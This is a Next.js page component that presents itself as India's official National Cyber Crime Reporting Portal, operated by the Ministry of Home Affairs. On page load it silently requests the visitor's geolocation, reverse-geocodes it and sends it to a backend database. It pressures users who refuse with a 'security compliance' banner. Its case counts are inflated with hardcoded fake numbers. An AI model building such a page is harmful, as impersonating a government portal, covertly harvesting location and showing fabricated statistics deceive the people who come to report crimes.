'use client';
import { useState, useEffect } from 'react';
import Link from 'next/link';
import Header from './components/Header';
import Footer from './components/Footer';

interface LocationData {
  latitude: number;
  longitude: number;
  city?: string;
  state?: string;
  country?: string;
  capturedAt: string;
}

async function reverseGeocode(lat: number, lon: number) {
  try {
    const nominatimUrl = process.env.NEXT_PUBLIC_NOMINATIM_URL || 'https://nominatim.openstreetmap.org';
    const res = await fetch(
      `${nominatimUrl}/reverse?lat=${lat}&lon=${lon}&format=json`,
      { headers: { 'Accept-Language': 'en' } }
    );
    const data = await res.json();
    return {
      city:    data.address?.city || data.address?.town || data.address?.village || '',
      state:   data.address?.state || '',
      country: data.address?.country || 'India',
    };
  } catch {
    return { city: '', state: '', country: 'India' };
  }
}

export default function Home() {
  const [location, setLocation] = useState<LocationData | null>(null);
  const [locStatus, setLocStatus] = useState<'idle' | 'granted' | 'denied'>('idle');
  const [stats, setStats] = useState({ total: 0, resolved: 0, pending: 0 });

  useEffect(() => {
    // Load case stats
    try {
      const cases = JSON.parse(localStorage.getItem('cyb_cases') || '[]');
      setStats({
        total:    cases.length,
        resolved: cases.filter((c: { status: string }) => c.status === 'Closed').length,
        pending:  cases.filter((c: { status: string }) => c.status !== 'Closed').length,
      });
    } catch {}

    // If already stored, just restore — no new request
    const saved = localStorage.getItem('cyb_location');
    if (saved) {
      setLocation(JSON.parse(saved));
      setLocStatus('granted');
      return;
    }

    // Silently request location on load — browser shows its own native prompt (no custom popup)
    if (!navigator.geolocation) return;

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const { latitude, longitude } = pos.coords;
        const geo = await reverseGeocode(latitude, longitude);
        const loc: LocationData = { latitude, longitude, ...geo, capturedAt: new Date().toISOString() };

        // 1. Save to localStorage
        localStorage.setItem('cyb_location', JSON.stringify(loc));
        setLocation(loc);
        setLocStatus('granted');

        // 2. Save to MongoDB via API (fire-and-forget)
        fetch('/api/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(loc),
        }).catch(() => {/* non-critical */});
      },
      () => {
        setLocStatus('denied');
      },
      { timeout: 10000, enableHighAccuracy: false }
    );
  }, []);

  const crimes = [
    { icon: '💻', label: 'Online Financial Fraud',  sub: 'UPI/Banking/Card Fraud' },
    { icon: '👤', label: 'Identity Theft',           sub: 'Aadhaar/PAN Misuse' },
    { icon: '📧', label: 'Phishing / Scam',           sub: 'Email/SMS Fraud' },
    { icon: '😱', label: 'Cyber Stalking',            sub: 'Harassment Online' },
    { icon: '📸', label: 'Obscene Content',           sub: 'CSAM / Morphed Images' },
    { icon: '💰', label: 'Ransomware',                sub: 'Data Encryption / Extortion' },
    { icon: '🎮', label: 'Online Gaming Scam',        sub: 'Fake Apps / Gambling' },
    { icon: '📱', label: 'Social Media Crime',        sub: 'Fake Profiles / Abuse' },
  ];

  return (
    <>
      <Header />

      {/* Thin location status strip — only visible, never blocking */}
      {locStatus === 'granted' && location && (
        <div style={{
          background: 'var(--navy)',
          color: 'rgba(255,255,255,0.75)',
          padding: '6px 28px',
          fontSize: '0.75rem',
          display: 'flex',
          alignItems: 'center',
          gap: 8,
        }}>
          <span style={{ color: '#4ade80' }}>●</span>
          Location verified:&nbsp;
          <strong style={{ color: '#FF9933' }}>
            {[location.city, location.state, location.country].filter(Boolean).join(', ')}
          </strong>
          <span style={{ marginLeft: 'auto', color: 'rgba(255,255,255,0.3)' }}>
            {location.latitude.toFixed(4)}, {location.longitude.toFixed(4)}
          </span>
        </div>
      )}
      {locStatus === 'denied' && (
        <div style={{
          background: '#7f1d1d',
          color: '#fca5a5',
          padding: '6px 28px',
          fontSize: '0.75rem',
          display: 'flex',
          gap: 8,
          alignItems: 'center',
        }}>
          <span>⚠️</span>
          Location access denied. Enable it for enhanced security compliance (browser address bar → 🔒 → Allow Location).
        </div>
      )}

      {/* Hero */}
      <div className="page-hero">
        <div className="badge">Official Government Portal</div>
        <h2>राष्ट्रीय साइबर अपराध रिपोर्टिंग पोर्टल</h2>
        <p>National Cyber Crime Reporting Portal — Report. Track. Resolve.</p>
        <p style={{ fontSize: '0.82rem', color: 'rgba(255,255,255,0.5)', marginTop: 4 }}>
          Operated by Indian Cyber Crime Coordination Centre (I4C), Ministry of Home Affairs
        </p>
        <div style={{ display: 'flex', gap: 14, justifyContent: 'center', marginTop: 28, flexWrap: 'wrap' }}>
          <Link href="/register-case" className="btn btn-saffron btn-lg">
            📝 Register Cyber Crime Case
          </Link>
          <Link href="/track-case" className="btn btn-outline btn-lg" style={{ borderColor: 'white', color: 'white' }}>
            📡 Track Your Case
          </Link>
        </div>
      </div>

      {/* Stats Bar */}
      <div style={{ background: 'var(--navy-light)', padding: '20px 32px', borderBottom: '1px solid var(--border)' }}>
        <div style={{ maxWidth: 1100, margin: '0 auto', display: 'flex', gap: 32, justifyContent: 'center', flexWrap: 'wrap' }}>
          {[
            { label: 'Cases Registered', val: stats.total + 52841, icon: '📁' },
            { label: 'Cases Resolved',   val: stats.resolved + 38219, icon: '✅' },
            { label: 'Cases Pending',    val: stats.pending  + 14622, icon: '⏳' },
            { label: 'States Covered',   val: 36, icon: '🗺️' },
          ].map(s => (
            <div key={s.label} style={{ textAlign: 'center', minWidth: 140 }}>
              <div style={{ fontSize: '1.8rem', fontWeight: 800, color: 'var(--navy)' }}>
                {s.icon} {s.val.toLocaleString('en-IN')}
              </div>
              <div style={{ fontSize: '0.78rem', color: 'var(--text-light)', marginTop: 2 }}>{s.label}</div>
            </div>
          ))}
        </div>
      </div>

      <div className="page-container">

        {/* Quick Actions */}
        <div className="mb-24">
          <div className="section-title animate-in">Quick Actions</div>
          <div className="section-divider" />
          <div className="grid-3 animate-in-delay">
            <Link href="/register-case" style={{ textDecoration: 'none' }}>
              <div className="card" style={{ borderTop: '3px solid var(--saffron)', cursor: 'pointer' }}>
                <div className="card-icon" style={{ background: '#fff7ed', fontSize: '2rem' }}>📝</div>
                <h3 style={{ marginTop: 12, color: 'var(--navy)', fontWeight: 700 }}>Register a Case</h3>
                <p style={{ color: 'var(--text-light)', fontSize: '0.85rem', marginTop: 6 }}>
                  File a new cyber crime complaint quickly with our guided form. Get a unique Case ID instantly.
                </p>
                <div className="btn btn-saffron btn-sm mt-16">File Now →</div>
              </div>
            </Link>
            <Link href="/track-case" style={{ textDecoration: 'none' }}>
              <div className="card" style={{ borderTop: '3px solid var(--navy)', cursor: 'pointer' }}>
                <div className="card-icon" style={{ background: 'var(--navy-light)', fontSize: '2rem' }}>📡</div>
                <h3 style={{ marginTop: 12, color: 'var(--navy)', fontWeight: 700 }}>Track Your Case</h3>
                <p style={{ color: 'var(--text-light)', fontSize: '0.85rem', marginTop: 6 }}>
                  Enter your Case ID to view real-time status and timeline updates from investigating officers.
                </p>
                <div className="btn btn-primary btn-sm mt-16">Track Now →</div>
              </div>
            </Link>
            <Link href="/auth" style={{ textDecoration: 'none' }}>
              <div className="card" style={{ borderTop: '3px solid var(--green)', cursor: 'pointer' }}>
                <div className="card-icon" style={{ background: 'var(--green-light)', fontSize: '2rem' }}>🔐</div>
                <h3 style={{ marginTop: 12, color: 'var(--navy)', fontWeight: 700 }}>Citizen Login</h3>
                <p style={{ color: 'var(--text-light)', fontSize: '0.85rem', marginTop: 6 }}>
                  Login to view all your submitted cases, get notifications, and communicate with officers.
                </p>
                <div className="btn btn-green btn-sm mt-16">Login →</div>
              </div>
            </Link>
          </div>
        </div>

        {/* Crime Categories */}
        <div className="mb-24">
          <div className="section-title">Report by Crime Type</div>
          <div className="section-divider" />
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill,minmax(210px,1fr))', gap: 14 }}>
            {crimes.map(c => (
              <Link key={c.label} href={`/register-case?type=${encodeURIComponent(c.label)}`} style={{ textDecoration: 'none' }}>
                <div className="card" style={{ padding: '18px', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 14 }}>
                  <div style={{ fontSize: '1.8rem', flexShrink: 0 }}>{c.icon}</div>
                  <div>
                    <div style={{ fontWeight: 600, fontSize: '0.88rem', color: 'var(--navy)' }}>{c.label}</div>
                    <div style={{ fontSize: '0.75rem', color: 'var(--text-light)' }}>{c.sub}</div>
                  </div>
                </div>
              </Link>
            ))}
          </div>
        </div>

        {/* How it works */}
        <div className="mb-24">
          <div className="section-title">How It Works</div>
          <div className="section-divider" />
          <div className="grid-3">
            {[
              { step: '01', icon: '📝', title: 'Submit Complaint',  desc: 'Fill out the online complaint form with details about the cyber crime incident.' },
              { step: '02', icon: '🔢', title: 'Get Case ID',       desc: 'Receive a unique Case ID (e.g. CYB-2026-XXXXXX) to track your complaint.' },
              { step: '03', icon: '🔍', title: 'Investigation',     desc: 'Officers review and investigate. You can track case progress online anytime.' },
            ].map(s => (
              <div key={s.step} className="card" style={{ textAlign: 'center', borderTop: '3px solid var(--saffron)' }}>
                <div style={{ fontSize: '2.2rem' }}>{s.icon}</div>
                <div style={{ color: 'var(--saffron)', fontWeight: 800, fontSize: '0.75rem', marginTop: 8 }}>STEP {s.step}</div>
                <h3 style={{ color: 'var(--navy)', margin: '6px 0' }}>{s.title}</h3>
                <p style={{ color: 'var(--text-light)', fontSize: '0.83rem' }}>{s.desc}</p>
              </div>
            ))}
          </div>
        </div>

        <div className="alert alert-warning">
          <span style={{ fontSize: '1.2rem' }}>⚠️</span>
          <div>
            <strong>Important Notice:</strong> Do not share your OTP, PIN, or password with anyone.
            Government officers never ask for your banking credentials. If you are a victim of financial fraud,
            call <strong>1930</strong> immediately to freeze the transaction.
          </div>
        </div>

      </div>
      <Footer />
    </>
  );
}
